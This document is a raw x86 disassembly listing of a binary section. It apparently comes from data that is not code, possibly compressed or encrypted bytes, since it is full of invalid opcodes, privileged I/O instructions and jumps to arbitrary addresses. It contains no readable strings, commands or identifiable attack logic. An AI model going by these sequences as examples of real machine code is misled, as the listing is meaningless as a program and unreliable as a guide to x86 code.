  41c01e:	xor    al,BYTE PTR [esi+0x6d3f6ef9]
  41c024:	nop
  41c025:	pop    ebp
  41c026:	pop    es
  41c027:	daa    
  41c028:	outs   dx,BYTE PTR ds:[esi]
  41c029:	enter  0xd138,0xb2
  41c02d:	rcl    DWORD PTR fs:[eax+0x54186786],1
  41c034:	pop    esi
  41c035:	push   ecx
  41c036:	sub    edx,DWORD PTR [edx]
  41c038:	pop    ebp
  41c039:	push   0x3e6b5d9d
  41c03e:	lods   eax,DWORD PTR ds:[esi]
  41c03f:	inc    eax
  41c040:	cs or  al,0x9a
  41c043:	mov    ecx,0x12b21a4e
  41c048:	pop    ecx
  41c049:	ins    BYTE PTR es:[edi],dx
  41c04a:	cmp    DWORD PTR [esi],0x50bbf4dc
  41c050:	jno    0x41c034
  41c052:	push   eax
  41c053:	scas   eax,DWORD PTR es:[edi]
  41c054:	mov    ds:0xc4260858,al
  41c059:	jge    0x41c098
  41c05b:	(bad)  
  41c05c:	xor    ch,BYTE PTR [ebp+0x6b]
  41c05f:	jbe    0x41c0ae
  41c061:	xor    al,BYTE PTR [ebp+0x6af0e8f0]
  41c067:	and    BYTE PTR [eax-0x221d19ee],cl
  41c06d:	int    0xc8
  41c06f:	outs   dx,BYTE PTR ds:[esi]
  41c070:	pop    esi
  41c071:	loope  0x41c04d
  41c073:	dec    edi
  41c074:	sti    
  41c075:	dec    ebp
  41c076:	ret    
  41c077:	xor    DWORD PTR [edi],eax
  41c079:	mov    esi,0x411a6b48
  41c07e:	mov    ebp,0x6e59888e
  41c083:	jne    0x41c02a
  41c085:	xor    al,0x27
  41c087:	scas   eax,DWORD PTR es:[edi]
  41c088:	dec    edx
  41c089:	fucom  st(4)
  41c08b:	xchg   ebx,eax
  41c08c:	enter  0x5da8,0xb7
  41c090:	lss    edi,FWORD PTR [eax+0x6a9debad]
  41c097:	push   edi
  41c098:	cmp    al,0xc
  41c09a:	dec    edx
  41c09b:	dec    edx
  41c09c:	mov    ch,0xde
  41c09e:	inc    edi
  41c09f:	or     al,0xba
  41c0a1:	dec    esi
  41c0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0a3:	in     al,dx
  41c0a4:	adc    DWORD PTR ds:0x9651386a,esi
  41c0aa:	sub    ebx,DWORD PTR [esi-0x3ae744c1]
  41c0b0:	sahf   
  41c0b1:	pop    ss
  41c0b2:	fadd   QWORD PTR [esp+ebx*1+0x6225cc5e]
  41c0b9:	mov    eax,ds:0x10178f55
  41c0be:	loope  0x41c0b2
  41c0c0:	in     al,dx
  41c0c1:	xchg   edx,eax
  41c0c2:	and    ch,BYTE PTR [ebx]
  41c0c4:	int    0x7f
  41c0c6:	push   esp
  41c0c7:	shr    BYTE PTR [ebp-0x48dba1d],cl
  41c0cd:	cld    
  41c0ce:	add    edx,ebp
  41c0d0:	pop    ebp
  41c0d1:	out    dx,eax
  41c0d2:	jle    0x41c0f7
  41c0d4:	add    esp,edi
  41c0d6:	gs leave 
  41c0d8:	jmp    0x3b84e567
  41c0dd:	popa   
  41c0de:	push   ss
  41c0df:	lods   eax,DWORD PTR ds:[esi]
  41c0e0:	mov    dl,0xef
  41c0e2:	jl     0x41c0cf
  41c0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0e5:	adc    BYTE PTR [edi],dl
  41c0e7:	cmp    ch,BYTE PTR [ebx]
  41c0e9:	and    al,0x90
  41c0eb:	mov    ds:0x6dd2f184,eax
  41c0f0:	and    ah,BYTE PTR [ebp-0x414becba]
  41c0f6:	mov    bl,0xbb
  41c0f8:	je     0x41c102
  41c0fa:	cmc    
  41c0fb:	jge    0x41c111
  41c0fd:	mov    gs,WORD PTR [esi]
  41c0ff:	xor    al,0x3b
  41c101:	in     eax,0xc3
  41c103:	jmp    0x76a3ce7e
  41c108:	sub    al,0x2c
  41c10a:	mov    edi,0x25dd461f
  41c10f:	add    DWORD PTR [eax],0x0
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0xf1e90501,0xffffffa5
  41c182:	adc    ebp,DWORD PTR [eax+edi*1+0x400012a]
  41c189:	add    DWORD PTR [eax],eax
  41c18b:	add    BYTE PTR [ebx-0x42],dh
  41c18e:	jp     0x41c13b
  41c190:	mov    bh,0x45
  41c192:	int    0x4f
  41c194:	mov    cs,WORD PTR [ebx+0x44d40c5d]
  41c19a:	mov    dh,0xe3
  41c19c:	or     esi,DWORD PTR [ebp-0x70941a6a]
  41c1a2:	mov    ebp,0xc8786cc5
  41c1a7:	xor    BYTE PTR [edx],0x8b
  41c1aa:	adc    al,0x60
  41c1ac:	fist   WORD PTR [eax+0x61]
  41c1af:	repz mov ds:0x36d6b520,al
  41c1b5:	mov    cl,dl
  41c1b7:	sahf   
  41c1b8:	popf   
  41c1b9:	cwde   
  41c1ba:	mov    dl,bh
  41c1bc:	scas   al,BYTE PTR es:[edi]
  41c1bd:	popf   
  41c1be:	call   0x44148885
  41c1c3:	jae    0x41c19a
  41c1c5:	add    ebp,esp
  41c1c7:	int    0x99
  41c1c9:	and    BYTE PTR [ebx],0x27
  41c1cc:	into   
  41c1cd:	jno    0x41c215
  41c1cf:	fld    TBYTE PTR [edx]
  41c1d1:	or     ah,bh
  41c1d3:	mov    WORD PTR [esi+0x55c1592],?
  41c1d9:	out    0x36,al
  41c1db:	or     edx,DWORD PTR [ebx]
  41c1dd:	or     eax,0x1f865eb2
  41c1e2:	push   eax
  41c1e3:	fst    st(6)
  41c1e5:	mov    eax,ds:0x903188d4
  41c1ea:	push   edi
  41c1eb:	pop    edi
  41c1ec:	js     0x41c231
  41c1ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1f0:	adc    DWORD PTR [edi-0x58],0xa33d1b1b
  41c1f7:	fs mov al,0x6e
  41c1fa:	adc    BYTE PTR [ecx-0x52],dl
  41c1fd:	cmp    eax,0x18a7694d
  41c202:	push   eax
  41c203:	and    DWORD PTR [esi+eiz*4-0x22],eax
  41c207:	cmp    eax,0x538f246d
  41c20c:	in     al,0xd8
  41c20e:	jl     0x41c281
  41c210:	push   ds
  41c211:	mov    DWORD PTR [edx],esi
  41c213:	mov    bl,0x62
  41c215:	in     al,0xf7
  41c217:	das    
  41c218:	ds push cs
  41c21a:	push   edx
  41c21b:	fst    st(0)
  41c21d:	or     BYTE PTR [eax+0x27],bh
  41c220:	into   
  41c221:	dec    esi
  41c222:	das    
  41c223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c224:	(bad)  
  41c225:	pop    esi
  41c226:	lahf   
  41c227:	xor    edi,ecx
  41c229:	ds loope 0x41c1e8
  41c22c:	jo     0x41c234
  41c22e:	sbb    ebx,DWORD PTR [edx]
  41c230:	retf   0xbbb
  41c233:	enter  0xcabb,0xfd
  41c237:	mov    ebp,0xe51a06c6
  41c23c:	stos   BYTE PTR es:[edi],al
  41c23d:	and    DWORD PTR [edi-0x41],esi
  41c240:	mov    dh,0xa6
  41c242:	lods   al,BYTE PTR ds:[esi]
  41c243:	mov    cl,0x56
  41c245:	sbb    ebp,DWORD PTR [ecx-0x6486df11]
  41c24b:	in     eax,dx
  41c24c:	xchg   DWORD PTR ds:[esi],ecx
  41c24f:	dec    edi
  41c250:	out    0x2e,eax
  41c252:	mov    ch,0x3c
  41c254:	ss pusha 
  41c256:	je     0x41c27a
  41c258:	rcr    ah,cl
  41c25a:	inc    esp
  41c25b:	pmulhw mm2,QWORD PTR [ebp-0x18]
  41c25f:	int    0xaf
  41c261:	add    BYTE PTR [ebx+0x67],bl
  41c264:	out    dx,al
  41c265:	mov    cl,BYTE PTR [edi-0x1c36f48b]
  41c26b:	lods   al,BYTE PTR ds:[esi]
  41c26c:	xchg   edx,eax
  41c26d:	jae    0x41c286
  41c26f:	pusha  
  41c270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c271:	fwait
  41c272:	or     DWORD PTR [eax-0x1a8c684b],edx
  41c278:	add    al,0xcd
  41c27a:	jbe    0x41c2b1
  41c27c:	hlt    
  41c27d:	es jbe 0x41c2ab
  41c280:	les    ebp,FWORD PTR [eax+0x7f]
  41c283:	add    DWORD PTR [ebx+0x5e],esp
  41c286:	in     al,0x4d
  41c288:	(bad)  
  41c28a:	inc    eax
  41c28b:	add    DWORD PTR [ebp+0xf7cfb8],edx
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	jmp    0x41c361
  41c302:	test   al,0xd4
  41c304:	cmp    al,0x2b
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	or     esi,DWORD PTR [esi+0x1b1b508c]
  41c312:	jmp    0xfe588999
  41c317:	clc    
  41c318:	daa    
  41c319:	not    DWORD PTR [edi+0x4dafb35d]
  41c31f:	ins    DWORD PTR es:[edi],dx
  41c320:	push   ss
  41c321:	shl    DWORD PTR [ecx-0x5f],0xcb
  41c325:	pop    ds
  41c326:	xlat   BYTE PTR ds:[ebx]
  41c327:	aas    
  41c328:	xchg   DWORD PTR [ebx-0xcf85135],esp
  41c32e:	shl    BYTE PTR [esi+ebx*8+0x2e],1
  41c332:	sbb    esi,DWORD PTR [eax+0x71]
  41c335:	fld    st(3)
  41c337:	xchg   esp,eax
  41c338:	cdq    
  41c339:	sbb    esp,edx
  41c33b:	sbb    ebp,DWORD PTR [ecx-0x335d7969]
  41c341:	bound  ecx,QWORD PTR [edi-0x2d]
  41c344:	(bad)  
  41c346:	retf   
  41c347:	mov    bh,0x8b
  41c349:	fwait
  41c34a:	pop    ebx
  41c34b:	and    eax,0x6a09ae41
  41c350:	jbe    0x41c2e8
  41c352:	dec    ebp
  41c353:	inc    eax
  41c354:	jl     0x41c31d
  41c356:	jns    0x41c3bc
  41c358:	fisttp DWORD PTR [ebx]
  41c35a:	outs   dx,DWORD PTR ds:[esi]
  41c35b:	imul   edi,eax,0x6962a4a0
  41c361:	and    eax,0xca707ddd
  41c366:	(bad)  
  41c367:	bound  esp,QWORD PTR [edx-0x220b5254]
  41c36d:	aam    0x7a
  41c36f:	out    dx,al
  41c370:	jb     0x41c3a2
  41c372:	xor    BYTE PTR [ebx+edx*1+0x6ad4c5d0],0x75
  41c37a:	xor    BYTE PTR [ecx+0x3b],ch
  41c37d:	dec    eax
  41c37e:	leave  
  41c37f:	cmc    
  41c380:	push   0xa2072a6a
  41c385:	xchg   BYTE PTR [edi-0x4b],dl
  41c388:	sub    al,0x19
  41c38a:	ins    DWORD PTR es:[edi],dx
  41c38b:	inc    esp
  41c38c:	inc    eax
  41c38d:	mov    dh,bl
  41c38f:	retf   
  41c390:	cmp    bl,bh
  41c392:	pop    ebp
  41c393:	cmp    al,0xbd
  41c395:	jo     0x41c408
  41c397:	gs inc ebp
  41c399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39a:	or     eax,0x5977d159
  41c39f:	std    
  41c3a0:	cmp    BYTE PTR [edi+0x44],cl
  41c3a3:	add    BYTE PTR [esi],bh
  41c3a5:	xor    eax,0x12703c4b
  41c3aa:	aaa    
  41c3ab:	shl    BYTE PTR [eax+0x79cccb3],1
  41c3b1:	sub    ebx,DWORD PTR [ebp+edi*2-0x2ebdfa1c]
  41c3b8:	jle    0x41c3b9
  41c3ba:	push   0xffffffb8
  41c3bc:	outs   dx,BYTE PTR ds:[esi]
  41c3bd:	adc    BYTE PTR [ebx],bl
  41c3bf:	repnz or eax,0x3e8f880c
  41c3c5:	neg    DWORD PTR [ebx-0x12]
  41c3c8:	dec    ebp
  41c3c9:	mov    ebp,0x89fc00fb
  41c3ce:	aam    0x75
  41c3d0:	dec    ebx
  41c3d1:	mov    ds:0x231a5401,eax
  41c3d6:	and    bl,BYTE PTR [ebx-0x5c]
  41c3d9:	fistp  QWORD PTR [ecx-0x727bf068]
  41c3df:	cmp    eax,0xdb3068b7
  41c3e4:	test   al,0xe0
  41c3e6:	push   eax
  41c3e7:	mov    dl,0x8
  41c3e9:	cmp    ch,BYTE PTR [eax-0x23]
  41c3ec:	popa   
  41c3ed:	cmp    edx,DWORD PTR [edi+edi*8]
  41c3f0:	push   esp
  41c3f1:	es pop edx
  41c3f3:	pop    eax
  41c3f4:	mov    ebx,0xb918a1f6
  41c3f9:	or     ch,0xd9
  41c3fc:	mov    ds:0xc1b98478,al
  41c401:	cwde   
  41c402:	outs   dx,BYTE PTR ds:[esi]
  41c403:	add    eax,eax
  41c405:	jno    0x41c392
  41c407:	ss into 
  41c409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c40a:	lock xlat BYTE PTR ds:[ebx]
  41c40c:	add    eax,0x1853f6
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	add    BYTE PTR [eax+0x2c40e96a],0x1
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	mov    ebp,0x2c4d3b08
  41c491:	pop    eax
  41c492:	mov    dh,0xe8
  41c494:	jnp    0x41c4ac
  41c496:	mov    dh,0x35
  41c498:	data16 or al,BYTE PTR [esi]
  41c49b:	xchg   esi,esp
  41c49d:	pop    ecx
  41c49e:	push   es
  41c49f:	(bad)  
  41c4a1:	push   ebp
  41c4a2:	sub    ah,al
  41c4a4:	pop    ebp
  41c4a5:	push   esi
  41c4a6:	and    dh,al
  41c4a8:	cld    
  41c4a9:	sub    al,0x77
  41c4ab:	fisub  DWORD PTR [ebp+0x3f]
  41c4ae:	dec    esp
  41c4af:	push   edi
  41c4b0:	push   ss
  41c4b1:	mov    ds:0xc0867dfc,eax
  41c4b6:	sub    cl,bl
  41c4b8:	out    dx,eax
  41c4b9:	mov    edi,0xde3e46e2
  41c4be:	lods   eax,DWORD PTR ds:[esi]
  41c4bf:	push   ss
  41c4c0:	(bad)  
  41c4c1:	jg     0x41c520
  41c4c3:	sbb    bh,ah
  41c4c5:	rcr    dl,1
  41c4c7:	aad    0xed
  41c4c9:	fwait
  41c4ca:	xchg   ebx,eax
  41c4cb:	cmp    al,BYTE PTR [ebx-0x20]
  41c4ce:	mov    ecx,0x8e33e45f
  41c4d3:	inc    edx
  41c4d4:	push   ds
  41c4d5:	cli    
  41c4d6:	ins    BYTE PTR es:[edi],dx
  41c4d7:	add    DWORD PTR [esi-0x1a],ebx
  41c4da:	xlat   BYTE PTR ds:[ebx]
  41c4db:	(bad)  
  41c4dc:	lock push 0x78
  41c4df:	cli    
  41c4e0:	mov    dl,BYTE PTR [edi+eiz*2+0x3a]
  41c4e4:	mov    BYTE PTR cs:[ebp-0x16],ah
  41c4e8:	ret    0x28b9
  41c4eb:	xor    al,0x2f
  41c4ed:	retf   
  41c4ee:	cmp    BYTE PTR [esi+eiz*8+0x3d85a47d],bh
  41c4f5:	mov    ecx,0xf0b7e78c
  41c4fa:	pop    ss
  41c4fb:	inc    edi
  41c4fc:	mov    DWORD PTR [eax-0x5a],eax
  41c4ff:	ror    edi,0x5b
  41c502:	pop    ds
  41c503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c504:	xchg   ecx,eax
  41c505:	(bad)  
  41c506:	fdivr  DWORD PTR [edi+0x65b20790]
  41c50c:	xchg   BYTE PTR [edi+0x46],dh
  41c50f:	pop    ecx
  41c510:	mov    ebx,0x3649a141
  41c515:	enter  0x53ce,0x59
  41c519:	inc    eax
  41c51a:	push   ebp
  41c51b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c51c:	rol    BYTE PTR [edi],0xc3
  41c51f:	mov    ds:0x73600a12,al
  41c524:	das    
  41c525:	mov    eax,ds:0x127b14c3
  41c52a:	outs   dx,BYTE PTR ds:[esi]
  41c52b:	les    esp,FWORD PTR [edi]
  41c52d:	xor    al,bh
  41c52f:	aas    
  41c530:	test   eax,0x709fc322
  41c535:	add    cl,BYTE PTR ds:0xfc31e186
  41c53b:	retf   0x2f5e
  41c53e:	mov    ds:0xee8f516d,al
  41c543:	sti    
  41c544:	rcr    DWORD PTR [edx+0x4],1
  41c547:	lahf   
  41c548:	idiv   DWORD PTR [esi-0x5a2dddb1]
  41c54e:	inc    edx
  41c54f:	xchg   esp,eax
  41c550:	or     al,0x7f
  41c552:	fs mov cl,0x8
  41c555:	xor    al,0x44
  41c557:	loope  0x41c53f
  41c559:	pop    eax
  41c55a:	xor    bl,ah
  41c55c:	ret    
  41c55d:	pop    edx
  41c55e:	(bad)  
  41c55f:	adc    al,0x32
  41c561:	fadd   st,st(1)
  41c563:	xchg   ecx,eax
  41c564:	cli    
  41c565:	dec    edi
  41c566:	jle    0x41c55e
  41c568:	addr16 ret 0xb338
  41c56c:	cmp    BYTE PTR [edi+0x650850b7],dh
  41c572:	aas    
  41c573:	push   ds
  41c574:	out    0x2,al
  41c576:	mov    edi,0xa137938d
  41c57b:	xor    bl,0x9d
  41c57e:	out    0xaa,al
  41c580:	xchg   edi,eax
  41c581:	scas   eax,DWORD PTR es:[edi]
  41c582:	xchg   edi,eax
  41c583:	mov    ds:0x7920ecbe,eax
  41c588:	sbb    al,0xde
  41c58a:	lods   eax,DWORD PTR ds:[esi]
  41c58b:	push   esi
  41c58c:	xchg   ebp,eax
  41c58d:	fnstenv [ecx-0x66]
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0xd9df2112
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	and    al,0xca
  41c60e:	cwde   
  41c60f:	stos   DWORD PTR es:[edi],eax
  41c610:	cmp    BYTE PTR [ecx+0x7e],ch
  41c613:	test   eax,0x4fe9a77
  41c618:	add    edi,eax
  41c61a:	div    DWORD PTR ds:0x603a63a7
  41c620:	(bad)  
  41c621:	frstor es:[ebx+edx*2]
  41c625:	leave  
  41c626:	mov    ah,0x16
  41c628:	sbb    al,0x5f
  41c62a:	sbb    ecx,DWORD PTR [esi]
  41c62c:	ret    
  41c62d:	daa    
  41c62e:	mov    ecx,DWORD PTR [esi-0x65eda4c5]
  41c634:	repz and ch,BYTE PTR [eax+edx*1]
  41c638:	adc    dl,BYTE PTR [edx-0x9120b51]
  41c63e:	sub    BYTE PTR [edi+0x6a3a01b0],dl
  41c644:	mov    al,ds:0xbf8fd086
  41c649:	jmp    0x41c5d5
  41c64b:	push   ecx
  41c64c:	fcomi  st,st(0)
  41c64e:	sbb    al,ch
  41c650:	les    ecx,FWORD PTR [ecx]
  41c652:	fsubr  QWORD PTR [edi]
  41c654:	lods   eax,DWORD PTR ds:[esi]
  41c655:	mov    al,0xc
  41c657:	in     al,0xac
  41c659:	fidivr DWORD PTR [edi-0x7e8713a1]
  41c65f:	mov    bh,0xf6
  41c661:	mov    fs,WORD PTR [ebp-0x47b9ea59]
  41c667:	fsub   QWORD PTR [eax]
  41c669:	addr16 dec eax
  41c66b:	stos   BYTE PTR es:[edi],al
  41c66c:	lds    esi,FWORD PTR [esi-0x7279d85c]
  41c672:	mov    edi,0xf30aa79a
  41c677:	pop    edx
  41c678:	inc    ecx
  41c679:	or     BYTE PTR ds:0x4035d632,0xe4
  41c680:	bound  eax,QWORD PTR ds:0x33ec16ad
  41c686:	pop    ss
  41c687:	push   es
  41c688:	lods   al,BYTE PTR ds:[esi]
  41c689:	mov    WORD PTR [ebx],cs
  41c68b:	and    BYTE PTR [esi],bh
  41c68d:	outs   dx,DWORD PTR ds:[esi]
  41c68e:	daa    
  41c68f:	sti    
  41c690:	dec    edi
  41c691:	int3   
  41c692:	pop    es
  41c693:	xor    dh,BYTE PTR [ebp+eax*8+0x44]
  41c697:	push   ebp
  41c698:	out    0xc6,al
  41c69a:	ja     0x41c706
  41c69c:	mov    cl,0x16
  41c69e:	(bad)  
  41c69f:	cdq    
  41c6a0:	test   eax,0x605d7f47
  41c6a5:	push   ebx
  41c6a6:	dec    ebp
  41c6a7:	(bad)  
  41c6a8:	aam    0x74
  41c6aa:	neg    cl
  41c6ac:	and    DWORD PTR [ebp-0x5c],esp
  41c6af:	fild   DWORD PTR [edi]
  41c6b1:	or     dh,cl
  41c6b3:	sbb    DWORD PTR [eax-0x3b236deb],ebp
  41c6b9:	push   esi
  41c6ba:	sbb    DWORD PTR [ebx],edi
  41c6bc:	sti    
  41c6bd:	cmp    eax,0xf26399df
  41c6c2:	and    al,0x4e
  41c6c4:	dec    eax
  41c6c5:	in     al,dx
  41c6c6:	inc    edx
  41c6c7:	imul   ebp,DWORD PTR [eax+0xbdfab56],0xfffffffb
  41c6ce:	pop    eax
  41c6cf:	loop   0x41c6c9
  41c6d1:	adc    BYTE PTR [ebx],ch
  41c6d3:	and    BYTE PTR [esi],al
  41c6d5:	xchg   ebp,eax
  41c6d6:	cmp    BYTE PTR [eax+0x10592313],0xe6
  41c6dd:	mov    ebp,0x909e9f25
  41c6e2:	pusha  
  41c6e3:	cwde   
  41c6e4:	mov    edx,0xfc60c014
  41c6e9:	je     0x41c71d
  41c6eb:	cmp    eax,0x46ec0507
  41c6f0:	jae    0x41c69d
  41c6f2:	mov    eax,ds:0x7eb16fe7
  41c6f7:	jb     0x41c6b3
  41c6f9:	mov    esp,0xc3c371f5
  41c6fe:	addr16 push ebp
  41c700:	repz push esp
  41c702:	(bad)  
  41c704:	mov    gs,WORD PTR [eax-0x2f]
  41c707:	inc    ebx
  41c708:	jmp    0x7852:0x42294a9d
  41c70f:	add    BYTE PTR ds:[eax],al
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	mov    es,edi
  41c782:	int    0x4
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	(bad)  
  41c78d:	inc    ecx
  41c78e:	xchg   DWORD PTR [edi-0x40],ecx
  41c791:	jl     0x41c7d1
  41c793:	outs   dx,DWORD PTR ds:[esi]
  41c794:	inc    edx
  41c795:	mov    eax,DWORD PTR [edi+0x71c34736]
  41c79b:	lahf   
  41c79c:	dec    edi
  41c79d:	pop    ss
  41c79e:	leave  
  41c79f:	xchg   ebp,eax
  41c7a0:	les    ecx,FWORD PTR [esi]
  41c7a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7a3:	or     eax,0xfc63853a
  41c7a8:	jmp    0x2daa7dda
  41c7ad:	data16 cli 
  41c7af:	retf   0xfd84
  41c7b2:	mov    eax,ds:0x6393e140
  41c7b7:	push   ecx
  41c7b8:	mov    ch,0x35
  41c7ba:	imul   edx,DWORD PTR [esi+0xd],0xffffffbe
  41c7be:	pop    edx
  41c7bf:	repnz sar DWORD PTR [edx+eax*2],0x95
  41c7c4:	ss pop esp
  41c7c6:	or     al,0xaa
  41c7c8:	bound  esp,QWORD PTR [edi]
  41c7ca:	xchg   ecx,eax
  41c7cb:	jle    0x41c828
  41c7cd:	les    edi,FWORD PTR ds:0x55dc79c3
  41c7d3:	out    dx,al
  41c7d4:	jae    0x41c83e
  41c7d6:	sti    
  41c7d7:	sbb    edx,DWORD PTR [ebx+ebx*2-0x3cebc55e]
  41c7de:	sbb    cl,BYTE PTR [edx]
  41c7e0:	mov    edi,0x8c49a218
  41c7e5:	dec    ecx
  41c7e6:	mov    bl,0x37
  41c7e8:	push   esi
  41c7e9:	int    0x62
  41c7eb:	aaa    
  41c7ec:	push   eax
  41c7ed:	inc    edi
  41c7ee:	gs jecxz 0x41c7d5
  41c7f1:	out    0xea,al
  41c7f3:	add    eax,0xf6c608ae
  41c7f8:	rol    DWORD PTR [edx+0x3e],cl
  41c7fb:	test   BYTE PTR [eax-0x76],cl
  41c7fe:	jb     0x41c79c
  41c800:	(bad)  [esp+ecx*1+0xc1769fd]
  41c807:	aad    0xf0
  41c809:	add    al,0xa
  41c80b:	cli    
  41c80c:	jecxz  0x41c794
  41c80e:	cs (bad) 
  41c810:	cmp    al,bl
  41c812:	dec    esp
  41c813:	push   ebx
  41c814:	scas   eax,DWORD PTR es:[edi]
  41c815:	pop    es
  41c816:	pop    edi
  41c817:	in     eax,dx
  41c818:	mov    ds:0x7c4ab733,eax
  41c81d:	jmp    0x41c7a7
  41c81f:	and    eax,DWORD PTR [esi+0x7e]
  41c822:	xchg   edi,eax
  41c823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c824:	call   0xb6fef923
  41c829:	sbb    DWORD PTR [eax],ecx
  41c82b:	mov    edx,0x8b333c22
  41c830:	int3   
  41c831:	(bad)  
  41c832:	ja     0x41c8a2
  41c834:	sub    BYTE PTR [eax-0x30eb2d74],ah
  41c83a:	push   ebx
  41c83b:	inc    esp
  41c83c:	test   cl,cl
  41c83e:	in     al,0x20
  41c840:	test   al,0x7e
  41c842:	sar    DWORD PTR [ebx-0x65],cl
  41c845:	push   eax
  41c846:	dec    esp
  41c847:	test   edi,esi
  41c849:	mov    WORD PTR [eax],fs
  41c84b:	cli    
  41c84c:	(bad)  
  41c84d:	lock adc ch,0x9f
  41c851:	xlat   BYTE PTR ds:[ebx]
  41c852:	jmp    0xb08a:0x17bc9bb9
  41c859:	inc    ebp
  41c85a:	inc    edi
  41c85b:	mov    ebx,0x5a096074
  41c860:	das    
  41c861:	icebp  
  41c862:	push   0xffffffef
  41c864:	mov    al,ds:0x746a16aa
  41c869:	enter  0xace5,0x19
  41c86d:	push   eax
  41c86e:	(bad)  
  41c86f:	test   al,0x30
  41c871:	sbb    ecx,esi
  41c873:	inc    ebp
  41c874:	pop    edi
  41c875:	lods   al,BYTE PTR ds:[esi]
  41c876:	push   ebx
  41c877:	sbb    ch,BYTE PTR [ebp+edx*4-0x3c]
  41c87b:	add    BYTE PTR [edi-0x1a],dl
  41c87e:	(bad)  
  41c880:	dec    esp
  41c881:	xlat   BYTE PTR ds:[ebx]
  41c882:	mov    esi,0xa8327a99
  41c887:	mov    esp,0x6feab8f6
  41c88c:	sbb    ebx,DWORD PTR [esi-0x50]
  41c88f:	sti    
	...
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [eax+0x26],ecx
  41c902:	sub    esi,DWORD PTR [edx]
  41c904:	dec    esp
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	xchg   esp,eax
  41c90d:	or     al,0x3d
  41c90f:	push   esi
  41c910:	push   edx
  41c911:	xchg   esp,eax
  41c912:	sub    al,0xd
  41c914:	cli    
  41c915:	mov    ds:0xa820b783,al
  41c91a:	call   0xa2d1:0xd81597cc
  41c921:	and    ebx,edi
  41c923:	push   esi
  41c924:	je     0x41c958
  41c926:	pop    edi
  41c927:	call   DWORD PTR ds:0xf6d43205
  41c92d:	dec    ecx
  41c92e:	xor    ch,BYTE PTR [eax+0x39]
  41c931:	or     eax,0xbe18e1bf
  41c936:	bnd jmp 0x41c9a4
  41c939:	adc    eax,0xedacbbfb
  41c93e:	mov    dl,0xf7
  41c940:	out    dx,eax
  41c941:	std    
  41c942:	and    dl,0x85
  41c945:	(bad)  
  41c946:	lods   eax,DWORD PTR ds:[esi]
  41c947:	in     al,0x9f
  41c949:	mov    ds:0xd4e76420,al
  41c94e:	jmp    0x41c936
  41c950:	test   BYTE PTR [eax+0x7dd612e9],cl
  41c956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c957:	ss into 
  41c959:	push   0x13a8d406
  41c95e:	data16 cmp ah,ch
  41c961:	imul   ecx,DWORD PTR [ebp-0x18],0x26dd531e
  41c968:	aas    
  41c969:	enter  0x3101,0x67
  41c96d:	daa    
  41c96e:	int    0x4d
  41c970:	add    edx,DWORD PTR [esi+0x6d]
  41c973:	pop    edx
  41c974:	out    dx,eax
  41c975:	repz sub DWORD PTR gs:[bx-0x4c],esi
  41c97b:	repnz addr16 in eax,dx
  41c97e:	dec    ebp
  41c97f:	jp     0x41c95a
  41c981:	mov    ebp,0xe14274f4
  41c986:	scas   eax,DWORD PTR es:[edi]
  41c987:	xchg   esp,eax
  41c988:	mov    dl,0xcc
  41c98a:	push   edx
  41c98b:	clc    
  41c98c:	push   ss
  41c98d:	jecxz  0x41c91a
  41c98f:	xchg   ebp,eax
  41c990:	mov    dl,0x8c
  41c992:	int3   
  41c993:	jg     0x41c93a
  41c995:	add    ebp,ebp
  41c997:	or     DWORD PTR [eax+eiz*1],0x1d5883c1
  41c99e:	mov    DWORD PTR [edx+0x7a],0x663e2bd5
  41c9a5:	in     al,0xc9
  41c9a7:	shl    DWORD PTR [edi-0x59],0xd0
  41c9ab:	aad    0x15
  41c9ad:	jae    0x41c99d
